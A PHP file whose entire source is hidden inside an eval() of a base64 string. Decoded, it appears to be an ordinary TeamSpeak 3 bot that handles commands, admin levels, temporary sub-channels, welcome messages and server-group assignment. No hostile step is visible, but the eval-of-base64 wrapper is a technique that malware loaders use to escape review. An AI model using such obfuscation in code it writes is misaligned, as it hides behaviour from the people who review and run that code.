<?php eval("?>".base64_decode('PD9waHANCg0KLy8gIC0tLS0tLS0tICBbICBWYXJzICBdICAtLS0tLS0tLSAgLy8NCg0KDQoNCi8vICAtLS0tLS0tLSAgWyAgQ29yZSAgXSAgLS0tLS0tLS0gIC8vDQoNCmZ1bmN0aW9uIGNvcmVfQm90Q29tbWFuZHMoVGVhbVNwZWFrM19BZGFwdGVyX1NlcnZlclF1ZXJ5X0V2ZW50ICRlKQ0Kew0KICBnbG9iYWwgJGNmZywgJGJvdF9pZCwgJHNydjsNCiAgJGluZm8gICA9ICRlLT5nZXREYXRhKCk7DQogICRjbGllbnQgPSAkc3J2LT5jbGllbnRHZXRCeU5hbWUoJGluZm9bImludm9rZXJuYW1lIl0tPnRvU3RyaW5nKCkpOw0KDQogICRhZG1pbmxldmVsID0gY29yZV9BdXRoZW50aWNhdGlvbigkY2xpZW50KTsNCiAgcHJpbnRsKCJVc2VyJ3MgYWRtaW4gbGV2ZWwgaXM6ICIuJGFkbWlubGV2ZWwpOw0KDQogIC8vICR0b3BpYyA9IHN0cnN0cignU29tZSB0b3BpYyA6OiBwYXJ0IHRvIGV4Y2x1ZGUnLCAnOjonLCBUUlVFKTsNCg0KICB0cnkNCiAgew0KICAgICRjbWQgPSBleHBsb2RlKCIgIiwgJGluZm9bIm1zZyJdKTsNCg0KICAgIGlmICAgICAoJGNtZFswXSA9PSAiIXBtbWUiICYmICRhZG1pbmxldmVsID49IDApICRjbGllbnQtPm1lc3NhZ2UoIuKAoiBIZWxsbywgaXQncyBtZSwgTWFnaWNCb3QhIOKAoiIpOw0KICAgIGVsc2VpZiAoJGNtZFswXSA9PSAiIWJvdHJlc3RhcnQiICYmICRhZG1pbmxldmVsID09IDMpIGNtZF9ib3RSZXN0YXJ0KCRlKTsNCiAgICBlbHNlaWYgKCRjbWRbMF0gPT0gIiFib3RyZWxvYWQiKSBlY2hvICJyZWxvYWQiOw0KICAgIGVsc2VpZiAoJGNtZFswXSA9PSAiIXNsZWVwIiAmJiAkYWRtaW5sZXZlbCA+PTEpIHNsZWVwKDEwKTsNCiAgICBlbHNlaWYgKCRjbWRbMF0gPT0gIiFtc2ciICYmICRhZG1pbmxldmVsID49IDEpIGVjaG8gIm1zZyI7IC8vY21kX3NlbmRQTSgkY21kKTsNCiAgICBlbHNlaWYgKCRjbWRbMF0gPT0gIiFhY2NlcHQiICYmICRjZmdbJ21vZHVsZXMnXVsnU0dfb25SdWxlc0FjY2VwdCddWydlbmFibGVkJ10pIHBsdWdpbl9TR29uUnVsZXNBY2NlcHQoJGUpOw0KICB9DQogIGNhdGNoIChFeGNlcHRpb24gJGV4KSAgICB7IHByaW50bCgkZXgtPmdldE1lc3NhZ2UoKS4iXG4iLCAnd2FybicsICJcbiIpOyB9DQp9DQoNCi8vIExvZyBvdXQgYW5kIHJlc3RhcnQgdGhlIGJvdA0KZnVuY3Rpb24gY21kX2JvdFJlc3RhcnQoVGVhbVNwZWFrM19BZGFwdGVyX1NlcnZlclF1ZXJ5X0V2ZW50ICRlKQ0Kew0KICBnbG9iYWwgJHNydjsNCiAgJGluZm8gPSAkZS0+Z2V0RGF0YSgpOw0KICAkc3J2LT5jbGllbnRHZXRCeU5hbWUoJGluZm9bImludm9rZXJuYW1lIl0tPnRvU3RyaW5nKCkpLT5tZXNzYWdlKCLigKIgUmVzdGFydGluZyBub3csIHBsZWFzZSBhbGxvdyB1cCB0byAxMCBzZWNvbmRzIOKAoiIpOw0KICAkc3J2LT5nZXRQYXJlbnQoKS0+bG9nb3V0KCk7DQogIHNoZWxsX2V4ZWMoJ3BocCBUZWFtc3BlYWtCb3QucGhwJyk7DQogIGV4aXQoKTsNCn0NCg0KDQpmdW5jdGlvbiBjbWRfc2VuZFBNKCkNCnsvKg0KICBnbG9iYWwgJGNmZywgJGJvdF9pZCwgJHNydjsNCiAgJGluZm8gICA9ICRlLT5nZXREYXRhKCk7DQoNCiAgdHJ5DQogIHsNCiAgICAkY21kID0gZXhwbG9kZSgiOiIsICRpbmZvWyJtc2ciXSk7DQogICAgJHNydi0+Y2xpZW50R2V0QnlVaWQoJGNtZFsxXSktPm1lc3NhZ2UodHJpbSgkY21kWzJdKSk7DQogIH0NCiAgY2F0Y2ggKEV4Y2VwdGlvbiAkZSkNCiAgew0KICAkc3J2LT5jbGllbnRHZXRCeU5hbWUoJGluZm9bImludm9rZXJuYW1lIl0tPnRvU3RyaW5nKCkpLT5tZXNzYWdlKCJFcnJvci4uIFlvdXIgcGFyYW1ldGVycyB3ZXJlIGluY29ycmVjdC4uIik7DQogIHByaW50bCgkZXgtPmdldE1lc3NhZ2UoKS4iXG4iLCAnd2FybicsICJcbiIpOw0KICB9Ki8NCn0NCg0KDQovLyBBbnRoZW50aWZpY2F0ZSB0aGUgdXNlciBhcyBiYXNpYywgYWRtaW4gb3Igc3VwZXItYWRtaW4NCmZ1bmN0aW9uIGNvcmVfQXV0aGVudGljYXRpb24oVGVhbVNwZWFrM19Ob2RlX0NsaWVudCAkdXNlcikNCnsNCiAgZ2xvYmFsICRjZmc7DQoNCiAgLy8gQ2hlY2sgaWYgc3VwZXIgYWRtaW4uDQogIGZvcmVhY2ggKCRjZmdbJ3N1cGVyLWFkbWluaXN0cmF0b3JzJ10gYXMgJGluZm8pDQogIHsNCiAgICBpZiAocHJlZ19tYXRjSCgnLz0vJywgJGluZm8pKQ0KICAgICAgJGMgPSBpc0NsaWVudHNVSUQoJHVzZXIsICRpbmZvKTsNCiAgICBlbHNlDQogICAgICAkYyA9IGlzU2VydmVyZ3JvdXBNZW1iZXIoJHVzZXIsICRpbmZvKTsNCg0KICAgIGlmICgkYykgcmV0dXJuIDM7DQogIH0NCg0KDQogIC8vIE5vdCBzdXBlciBhZG1pbj8gQ2hlY2sgaWYgYWRtaW4uDQogIGZvcmVhY2ggKCRjZmdbJ2FkbWluaXN0cmF0b3JzJ10gYXMgJGluZm8pDQogIHsNCiAgICBpZiAocHJlZ19tYXRjSCgnLz0vJywgJGluZm8pKQ0KICAgICAgJGMgPSBpc0NsaWVudHNVSUQoJHVzZXIsICRpbmZvKTsNCiAgICBlbHNlDQogICAgICAkYyA9IGlzU2VydmVyZ3JvdXBNZW1iZXIoJHVzZXIsICRpbmZvKTsNCg0KICAgIGlmICgkYykgcmV0dXJuIDI7DQogIH0NCg0KDQogIC8vIE5vdCBhZG1pbj8gQ2hlY2sgaWYgbW9kZXJhdG9yLg0KICBmb3JlYWNoICgkY2ZnWydtb2RlcmF0b3JzJ10gYXMgJGluZm8pDQogIHsNCiAgICBpZiAocHJlZ19tYXRjSCgnLz0vJywgJGluZm8pKQ0KICAgICAgJGMgPSBpc0NsaWVudHNVSUQoJHVzZXIsICRpbmZvKTsNCiAgICBlbHNlDQogICAgICAkYyA9IGlzU2VydmVyZ3JvdXBNZW1iZXIoJHVzZXIsICRpbmZvKTsNCg0KICAgIGlmICgkYykgcmV0dXJuIDE7DQogIH0NCg0KICAvLyBOb25lIG9mIHRoZW0/IFJldHVybiBhIDAuDQogIHJldHVybiAwOw0KfQ0KDQoNCg0KLy8gIC0tLS0tLS0tICBbICBQbHVnaW5zICBdICAtLS0tLS0tLSAgLy8NCg0KZnVuY3Rpb24gcGx1Z2luX1N1YkNoYW5uZWxzKFRlYW1TcGVhazNfQWRhcHRlcl9TZXJ2ZXJRdWVyeV9FdmVudCAkZSkNCnsNCglwcmludGwoIkVudGVyIFN1YkNoYW5uZWwgY2hlY2siKTsNCglnbG9iYWwgJGNmZywgJGJvdF9pZCwgJHNydjsNCgkkZGF0YSA9ICRlLT5nZXREYXRhKCk7DQoNCiAgLy8gQ2hlY2sgaWYgdGhlIGNsaWVudCBpcyBpZ25vcmVkLCBpZiBub3QsIGNvbnRpbnVlDQogIC8vIGlmIChpc1NlcnZlcmdyb3VwTWVtYmVyKCRzcnYtPmNsaWVudEdldEJ5SWQoJGRhdGFbJ2NsaWQnXSksICRjZmdbJ21vZHVsZXMnXVsnc3ViX2NoYW5uZWwnXVsnY2ZnJ11bJ2lnbm9yZWRfc2cnXSkpIHJldHVybjsNCg0KICAvLyBQZXJzb25hbGlzZWQgY2hhbm5lbHMuDQogIGlmICgkY2ZnWydtb2R1bGVzJ11bJ3N1Yl9jaGFubmVsX3BlcnNvbmFsaXNlZCddWydlbmFibGVkJ10pDQogIHsNCiAgICBmb3JlYWNoKCRjZmdbJ21vZHVsZXMnXVsnc3ViX2NoYW5uZWxfcGVyc29uYWxpc2VkJ11bJ2NmZyddWydydWxlcyddIGFzICRydWxlKQ0KICAgIHsNCiAgICAgIGlmICgkZGF0YVsnY3RpZCddID09ICRydWxlWzBdKQ0KICAgICAgew0KICAgICAgICB0cnkNCiAgICAgICAgew0KICAgICAgICAgIGZvcmVhY2ggKCRzcnYtPmNsaWVudEdldElkc0J5VWlkKCRydWxlWzJdKSBhcyAkaWQpDQogICAgICAgICAgew0KICAgICAgICAgICAgaWYgKCRpZFsnY2xpZCddID09ICRkYXRhWydjbGlkJ10pDQogICAgICAgICAgICB7DQogICAgICAgICAgICAgICRjaGFuX3Byb3BlcnRpZXMgPSBbDQogICAgICAgICAgICAgICAgICAgICAgICAgICJjaGFubmVsX25hbWUiICAgICAgICAgICAgICAgICAgICAgICAJCQkJPT4gJHJ1bGVbM10sDQogICAgICAgICAgICAgICAgICAgICAgICAgICJjaGFubmVsX2ZsYWdfdGVtcG9yYXJ5IiAgICAgICAgICAgICAJCQkJPT4gVFJVRSwNCiAgICAgICAgICAgICAgICAgICAgICAgICAgImNoYW5uZWxfZGVsZXRlX2RlbGF5IiAJCSAgICAgICAgICAgCQkJCT0+ICRjZmdbJ21vZHVsZXMnXVsnc3ViX2NoYW5uZWxfcGVyc29uYWxpc2VkJ11bJ2NmZyddWydjaGFubmVsX2RlbGV0ZV9kZWxheSddLA0KICAgICAgICAgICAgICAgICAgICAgICAgICAiY3BpZCIgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgCQkJCT0+ICRydWxlWzBdLA0KICAgICAgICAgICAgICAgICAgICAgICAgICAiY2hhbm5lbF9wYXNzd29yZCIgICAgICAgICAgICAgICAgICAgCQkJCT0+ICRydWxlWzFdLA0KICAgICAgICAgICAgICAgICAgICAgICAgICAiY2hhbm5lbF9mbGFnX21heGZhbWlseWNsaWVudHNfaW5oZXJpdGVkIgkJPT4gJGNmZ1snbW9kdWxlcyddWydzdWJfY2hhbm5lbF9wZXJzb25hbGlzZWQnXVsnY2ZnJ11bJ2NoYW5uZWxfbWF4ZmFtaWx5Y2xpZW50X2luaGVyaXRlZCddDQogICAgICAgICAgICAgICAgICAgICAgICBdOw0KDQogICAgICAgICAgICAgIGlmICgkY2ZnWydtb2R1bGVzJ11bJ3N1Yl9jaGFubmVsX3BlcnNvbmFsaXNlZCddWydjZmcnXVsnY2hhbm5lbF9tYXhfY2xpZW50J10gPiAwKSB7DQogICAgICAgICAgICAgICAgJGNoYW5fcHJvcGVydGllc1snY2hhbm5lbF9mbGFnX21heGNsaWVudHNfdW5saW1pdGVkJ10gICAgID0gRkFMU0U7DQogICAgICAgICAgICAgICAgJGNoYW5fcHJvcGVydGllc1snY2hhbm5lbF9tYXhjbGllbnRzJ10gICAgICAgICAgICAgICAgICAgID0gJGNmZ1snbW9kdWxlcyddWydzdWJfY2hhbm5lbF9wZXJzb25hbGlzZWQnXVsnY2ZnJ11bJ2NoYW5uZWxfbWF4X2NsaWVudCddOw0KICAgICAgICAgICAgICB9DQogICAgICAgICAgICAgIGVsc2VpZiAoJGNmZ1snbW9kdWxlcyddWydzdWJfY2hhbm5lbF9wZXJzb25hbGlzZWQnXVsnY2ZnJ11bJ2NoYW5uZWxfbWF4X2NsaWVudCddID09IDApDQogICAgICAgICAgICAgICAgJGNoYW5fcHJvcGVydGllc1snY2hhbm5lbF9mbGFnX21heGNsaWVudHNfdW5saW1pdGVkJ10gICAgID0gRkFMU0U7DQogICAgICAgICAgICAgIGVsc2VpZiAoJGNmZ1snbW9kdWxlcyddWydzdWJfY2hhbm5lbF9wZXJzb25hbGlzZWQnXVsnY2ZnJ11bJ2NoYW5uZWxfbWF4X2NsaWVudCddID09IC0xKQ0KICAgICAgICAgICAgICAgICRjaGFuX3Byb3BlcnRpZXNbJ2NoYW5uZWxfZmxhZ19tYXhjbGllbnRzX3VubGltaXRlZCddICAgICA9IFRSVUU7DQoNCiAgICAgICAgICAgICAgJGNyZWF0ZWRJZAk9ICRzcnYtPmNoYW5uZWxDcmVhdGUoJGNoYW5fcHJvcGVydGllcyk7DQogICAgICAgICAgICAgICRzcnYtPmNsaWVudE1vdmUoJGJvdF9pZCwgJGNmZ1snYm90X2RlZmF1bHRfY2hhbm5lbF9pZCddLCAkY2ZnWydib3RfZGVmYXVsdF9jaGFubmVsX3Bhc3MnXSk7DQogICAgICAgICAgICAgICRzcnYtPmNsaWVudE1vdmUoJGRhdGFbJ2NsaWQnXSwgJGNyZWF0ZWRJZCwgJHJ1bGVbMV0pOw0KDQogICAgICAgICAgICAgIHByaW50bCgiUGVyc29uYWxpc2VkIHN1Yi1jaGFubmVsIGNyZWF0ZWQgOiAiLiRydWxlWzNdLiIgKFBhcmVudElEICIuJHJ1bGVbMF0uIikgKENoYW5uZWxJRCAiLiRjcmVhdGVkSWQuIikiKTsNCiAgICAgICAgICAgICAgcmV0dXJuIDE7DQogICAgICAgICAgICB9DQogICAgICAgICAgfQ0KICAgICAgICB9DQogICAgICAgIGNhdGNoIChFeGNlcHRpb24gJGUpIHsNCiAgICAgICAgICBwcmludGwoIkNoYW5uZWwgY3JlYXRpb24gaXMgbm90IHBvc3NpYmxlOiAiLiRlLT5nZXRNZXNzYWdlKCksICd3YXJuJyk7DQogICAgICAgIH0NCiAgICAgIH0NCiAgICB9DQogIH0NCg0KDQogIC8vIFN1Yi1jaGFubmVscyBjaGFubmVscy4NCiAgaWYgKCRjZmdbJ21vZHVsZXMnXVsnc3ViX2NoYW5uZWwnXVsnZW5hYmxlZCddKQ0KICB7DQogICAgZm9yZWFjaCgkY2ZnWydtb2R1bGVzJ11bJ3N1Yl9jaGFubmVsJ11bJ2NmZyddWydydWxlcyddIGFzICRydWxlKQ0KICAgIHsNCiAgICAgIGlmICgkZGF0YVsnY3RpZCddID09ICRydWxlWzBdKQ0KICAgICAgew0KICAgICAgICAkY291bnQgPSBjb3VudCgkcnVsZSk7DQogICAgICAgICRleGlzdCA9IDE7DQogICAgICAgICRpID0gMTsNCg0KICAgICAgICBpZiAoJGNvdW50ID4gMykgLy8gTW9kdWxlID0gc3RhdGljDQogICAgICAgIHsNCiAgICAgICAgICB3aGlsZSAoJGV4aXN0ID09IDEgJiYgJGkgPCAkY291bnQpDQogICAgICAgICAgew0KICAgICAgICAgICAgKyskaTsNCiAgICAgICAgICAgICRleGlzdCA9IGNoYW5uZWxFeGlzdCgkcnVsZVskaV0pOw0KICAgICAgICAgIH0NCiAgICAgICAgICBpZiAoJGV4aXN0ID09IDApDQogICAgICAgICAgICAkY2hhbm5lbF9uYW1lID0gJHJ1bGVbJGldOw0KICAgICAgICB9DQogICAgICAgIGVsc2VpZiAoJGNvdW50ID09IDMpIC8vIE1vZHVsZSA9IGR5bmFtaWMNCiAgICAgICAgew0KICAgICAgICAgIC0tJGk7DQogICAgICAgICAgJG1heF9zdWJjaGFubmVsc19jcmVhdGUgPSAkY2ZnWydtb2R1bGVzJ11bJ3N1Yl9jaGFubmVsJ11bJ2NmZyddWydtYXhfc3ViY2hhbm5lbHNfY3JlYXRlJ107DQogICAgICAgICAgaWYgKDAgPCAkbWF4X3N1YmNoYW5uZWxzX2NyZWF0ZSAmJiAkbWF4X3N1YmNoYW5uZWxzX2NyZWF0ZSA8PSAyMDApDQogICAgICAgICAgew0KICAgICAgICAgICAgd2hpbGUgKCRleGlzdCA9PSAxICYmICRpIDw9ICRtYXhfc3ViY2hhbm5lbHNfY3JlYXRlKQ0KICAgICAgICAgICAgew0KICAgICAgICAgICAgICArKyRpOw0KICAgICAgICAgICAgICAkZXhpc3QgPSBjaGFubmVsRXhpc3QoJHJ1bGVbMl0uJGkpOw0KICAgICAgICAgICAgfQ0KICAgICAgICAgICAgaWYgKCRleGlzdCA9PSAwKQ0KICAgICAgICAgICAgICAkY2hhbm5lbF9uYW1lID0gJHJ1bGVbMl0uJGk7DQogICAgICAgICAgfQ0KICAgICAgICB9DQogICAgICAgIGVsc2Ugew0KICAgICAgICAgIHByaW50bCgiU3ViLUNoYW5uZWwgTW9kdWxlOiBSdWxlIHBhcmFtZXRlcnMgc2VlbXMncyBpbmNvcnJlY3QiLCAnd2FybicsICJcbiIpOw0KICAgICAgICAgIHJldHVybiAwOw0KICAgICAgICB9DQoNCiAgICAgICAgaWYgKGlzc2V0KCRjaGFubmVsX25hbWUpKQ0KICAgICAgICB7DQogICAgICAgICAgdHJ5DQogICAgICAgICAgew0KICAgICAgICAgICAgJGNoYW5fcHJvcGVydGllcyA9IFsNCiAgICAgICAgICAgICAgICAgICAgICAgICJjaGFubmVsX25hbWUiICAgICAgICAgICAgICAgICAgICAgICA9PiAkY2hhbm5lbF9uYW1lLA0KICAgICAgICAgICAgICAgICAgICAgICAgImNoYW5uZWxfZmxhZ190ZW1wb3JhcnkiICAgICAgICAgICAgID0+IFRSVUUsDQogICAgICAgICAgICAgICAgICAgICAgICAiY2hhbm5lbF9kZWxldGVfZGVsYXkiIAkJICAgICAgICAgICA9PiAkY2ZnWydtb2R1bGVzJ11bJ3N1Yl9jaGFubmVsJ11bJ2NmZyddWydjaGFubmVsX2RlbGV0ZV9kZWxheSddLA0KICAgICAgICAgICAgICAgICAgICAgICAgImNwaWQiICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgID0+ICRydWxlWzBdLA0KICAgICAgICAgICAgICAgICAgICAgICAgImNoYW5uZWxfcGFzc3dvcmQiICAgICAgICAgICAgICAgICAgID0+ICRydWxlWzFdDQogICAgICAgICAgICAgICAgICAgICAgXTsNCiAgICAgICAgICAgIGlmICgkY2ZnWydtb2R1bGVzJ11bJ3N1Yl9jaGFubmVsJ11bJ2NmZyddWydjaGFubmVsX21heF9jbGllbnQnXSA+IDApDQogICAgICAgICAgICB7DQogICAgICAgICAgICAgICRjaGFuX3Byb3BlcnRpZXNbJ2NoYW5uZWxfZmxhZ19tYXhjbGllbnRzX3VubGltaXRlZCddID0gRkFMU0U7DQogICAgICAgICAgICAgICRjaGFuX3Byb3BlcnRpZXNbJ2NoYW5uZWxfbWF4Y2xpZW50cyddID0gJGNmZ1snbW9kdWxlcyddWydzdWJfY2hhbm5lbCddWydjZmcnXVsnY2hhbm5lbF9tYXhfY2xpZW50J107DQogICAgICAgICAgICB9DQogICAgICAgICAgICBlbHNlaWYgKCRjZmdbJ21vZHVsZXMnXVsnc3ViX2NoYW5uZWxfcGVyc29uYWxpc2VkJ11bJ2NmZyddWydjaGFubmVsX21heF9jbGllbnQnXSA9PSAwKQ0KICAgICAgICAgICAgICAkY2hhbl9wcm9wZXJ0aWVzWydjaGFubmVsX2ZsYWdfbWF4Y2xpZW50c191bmxpbWl0ZWQnXSA9IEZBTFNFOw0KICAgICAgICAgICAgZWxzZWlmICgkY2ZnWydtb2R1bGVzJ11bJ3N1Yl9jaGFubmVsJ11bJ2NmZyddWydjaGFubmVsX21heF9jbGllbnQnXSA9PSAtMSkNCiAgICAgICAgICAgICAgJGNoYW5fcHJvcGVydGllc1snY2hhbm5lbF9mbGFnX21heGNsaWVudHNfdW5saW1pdGVkJ10gPSBUUlVFOw0KDQoNCiAgICAgICAgICAgICRjcmVhdGVkSWQgCT0gJHNydi0+Y2hhbm5lbENyZWF0ZSgkY2hhbl9wcm9wZXJ0aWVzKTsNCiAgICAgICAgICAgICRzcnYtPmNsaWVudE1vdmUoJGJvdF9pZCwgJGNmZ1snYm90X2RlZmF1bHRfY2hhbm5lbF9pZCddLCAkY2ZnWydib3RfZGVmYXVsdF9jaGFubmVsX3Bhc3MnXSk7DQogICAgICAgICAgICAkc3J2LT5jbGllbnRNb3ZlKCRkYXRhWydjbGlkJ10sICRjcmVhdGVkSWQsICRydWxlWzFdKTsNCg0KICAgICAgICAgICAgcHJpbnRsKCJDaGFubmVsIGNyZWF0ZWQgOiAiLiRjaGFubmVsX25hbWUuIiAoUGFyZW50SUQgIi4kcnVsZVswXS4iKSAoQ2hhbm5lbElEICIuJGNyZWF0ZWRJZC4iKSIpOw0KICAgICAgICAgICAgcmV0dXJuIDE7DQogICAgICAgICAgfQ0KICAgICAgICAgIGNhdGNoIChFeGNlcHRpb24gJGUpIHsNCiAgICAgICAgICAgIHByaW50bCgiQ2hhbm5lbCBjcmVhdGlvbiBpcyBub3QgcG9zc2libGU6ICIuJGUtPmdldE1lc3NhZ2UoKSwgJ3dhcm4nKTsNCiAgICAgICAgICB9DQogICAgICAgIH0NCiAgICAgICAgZWxzZQ0KICAgICAgICB7DQogICAgICAgICAgLy8gTm90aWZ5IHRoZSBjbGllbnQgdGhhdCB0aGUgbGltaXQgaGFzIGJlZW4gcmVhY2hlZC4NCiAgICAgICAgICAkc3J2LT5jbGllbnRHZXRCeUlkKCRkYXRhWydjbGlkJ10pLT5tZXNzYWdlKCRjZmdbJ21vZHVsZXMnXVsnc3ViX2NoYW5uZWwnXVsnY2ZnJ11bJ3JlYWNoZWRfbGltaXRfbXNnJ10pOw0KICAgICAgICAgIHByaW50bCgib25Nb3ZlZDogQ2FuJ3QgY3JlYXRlIGNoYW5uZWwgYmVjYXVzZSBTdWItY2hhbm5lbHMgbGltaXQgaGFzIGJlZW4gcmVhY2hlZC4iKTsNCiAgICAgICAgICByZXR1cm4gMDsNCiAgICAgICAgfQ0KICAgICAgfQ0KICAgIH0NCiAgfQ0KfQ0KDQoNCg0KZnVuY3Rpb24gcGx1Z2luX1dlbGNvbWVQbShUZWFtU3BlYWszX0FkYXB0ZXJfU2VydmVyUXVlcnlfRXZlbnQgJGUpDQp7DQogIGdsb2JhbCAkY2ZnLCAkc3J2Ow0KICAkZGF0YSA9ICRlLT5nZXREYXRhKCk7DQoNCiAgJGNsX3NncyA9IGV4cGxvZGUoIiwiLCAkZGF0YVsnY2xpZW50X3NlcnZlcmdyb3VwcyddKTsNCg0KICB0cnkNCiAgew0KICAgIGZvcmVhY2ggKCRjZmdbJ21vZHVsZXMnXVsnd2VsY29tZV9wbSddWydtc2cnXVsncnVsZXMnXSBhcyAkcnVsZSkNCiAgICB7DQogICAgICAkc2dzID0gZXhwbG9kZSgiLCIsICRydWxlWzBdKTsNCg0KICAgICAgaWYgKGlzR29vZFRvUmVjZWl2ZVNHUygkc2dzLCAkY2xfc2dzLCAkcnVsZVsxXSkpDQogICAgICAgICRzcnYtPmNsaWVudEdldEJ5SWQoJGRhdGFbImNsaWQiXSktPm1lc3NhZ2UoJHJ1bGVbMl0pOw0KDQogICAgICB1bnNldCgkZGF0YSwgJGNsX3NncywgJGUpOw0KICAgICAgcmV0dXJuOw0KICAgIH0NCiAgfQ0KICBjYXRjaCAoRXhjZXB0aW9uICRlKQ0KICB7DQogICAgcHJpbnRsKCJXZWxjb21lIFBNIGNvdWxkIG5vdCBiZSBzZW50OiAiLiRlLT5nZXRNZXNzYWdlKCksICd3YXJuJyk7DQogIH0NCn0NCg0KZnVuY3Rpb24gcGx1Z2luX0NoYW5uZWxOb3RpZnkoVGVhbVNwZWFrM19BZGFwdGVyX1NlcnZlclF1ZXJ5X0V2ZW50ICRlKQ0Kew0KICBnbG9iYWwgJGNmZywgJHNydjsNCiAgJGRhdGEgPSAkZS0+Z2V0RGF0YSgpOw0KDQogICRjbF9zZ3MgPSBleHBsb2RlKCIsIiwgJGRhdGFbJ2NsaWVudF9zZXJ2ZXJncm91cHMnXSk7DQoNCg0KICAkc3J2LT5jbGllbnRHZXRCeUlkKCRkYXRhWyJjbGlkIl0pOw0KfQ0KDQoNCmZ1bmN0aW9uIHBsdWdpbl9TR29uUnVsZXNBY2NlcHQoVGVhbVNwZWFrM19BZGFwdGVyX1NlcnZlclF1ZXJ5X0V2ZW50ICRlKQ0Kew0KICBnbG9iYWwgJGNmZywgJHNydjsNCiAgJGRhdGEgPSAkZS0+Z2V0RGF0YSgpOw0KDQogICRjbCA9ICRzcnYtPmNsaWVudEdldEJ5TmFtZSgkZGF0YVsiaW52b2tlcm5hbWUiXS0+dG9TdHJpbmcoKSk7DQoNCiAgZm9yZWFjaCAoJGNmZ1snbW9kdWxlcyddWydTR19vblJ1bGVzQWNjZXB0J11bJ3Nnc190b2dpdmUnXSBhcyAkaWQpDQogIHsNCiAgICBpZiAoIWlzU2VydmVyZ3JvdXBNZW1iZXIoJGNsLCBhcnJheSh0cmltKCRpZCkpKSkgJGNsLT5hZGRTZXJ2ZXJHcm91cCh0cmltKCRpZCkpOw0KICB9DQoNCiAgJGNsLT5tZXNzYWdlKCRjZmdbJ21vZHVsZXMnXVsnU0dfb25SdWxlc0FjY2VwdCddWydjbGllbnRfbXNnJ10pOw0KfQ0KDQoNCg0KZnVuY3Rpb24gcGx1Z2luX1NHb25DaGFubmVsSm9pbihUZWFtU3BlYWszX0FkYXB0ZXJfU2VydmVyUXVlcnlfRXZlbnQgJGUpDQp7DQogIGdsb2JhbCAkY2ZnLCAkc3J2Ow0KDQogIGlmICgkY2ZnWydtb2R1bGVzJ11bJ1NHX29uQ2hhbm5lbEpvaW4nXVsnZW5hYmxlZCddKQ0KICB7DQogICAgJGRhdGEgPSAkZS0+Z2V0RGF0YSgpOw0KICAgICRjbCA9ICRzcnYtPmNsaWVudEdldEJ5SWQoJGRhdGFbImNsaWQiXSk7DQoNCiAgICBmb3JlYWNoICgkY2ZnWydtb2R1bGVzJ11bJ1NHX29uQ2hhbm5lbEpvaW4nXVsncnVsZXMnXSBhcyAkcnVsZSkNCiAgICB7DQogICAgICAkY2hhbnMgID0gYXJyYXlfbWFwKCd0cmltJywgZXhwbG9kZSgiLCIsICRydWxlWzFdKSk7DQoNCiAgICAgIGlmIChpbl9hcnJheSgkZGF0YVsnY3RpZCddLCAkY2hhbnMpKQ0KICAgICAgew0KICAgICAgICAkc2dzICAgID0gYXJyYXlfbWFwKCd0cmltJywgZXhwbG9kZSgiLCIsICRydWxlWzBdKSk7DQogICAgICAgIGZvcmVhY2ggKCRzZ3MgYXMgJGlkKQ0KICAgICAgICB7DQogICAgICAgICAgaWYgKCFpc1NlcnZlcmdyb3VwTWVtYmVyKCRjbCwgYXJyYXkoJGlkKSkpICRjbC0+YWRkU2VydmVyR3JvdXAoJGlkKTsNCiAgICAgICAgfQ0KICAgICAgICBpZigkcnVsZVsyXSkgJGNsLT5tZXNzYWdlKCRydWxlWzJdKTsNCiAgICAgICAgaWYoJHJ1bGVbM10pICRjbC0+a2ljayg0KTsNCiAgICAgICAgYnJlYWs7DQogICAgICB9DQogICAgfQ0KICB9DQp9DQoNCg0KDQo/Pg0K')."<?");?>